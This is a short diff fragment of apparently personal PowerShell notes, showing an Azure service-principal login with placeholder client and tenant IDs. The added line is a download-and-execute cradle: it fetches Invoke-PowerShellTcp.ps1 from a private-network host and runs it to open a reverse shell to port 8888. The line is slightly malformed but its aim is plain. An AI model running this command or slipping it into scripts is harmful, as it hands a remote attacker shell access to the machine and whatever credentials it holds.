@@ -8,3 +8,4 @@ $creds = New-Object System.Management.Automation.PSCredential ("CLIENT_ID", $pas
 
 Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant TENANT_ID
 ---------------------
+iex (New-ObjectNet.Webclient).downloadstring("http://10.0.10.X/Invoke-PowerShellTcp.ps1") Invoke-PowerShellTcp -Reverse -IPAddress 10.0.10.X -Port 8888
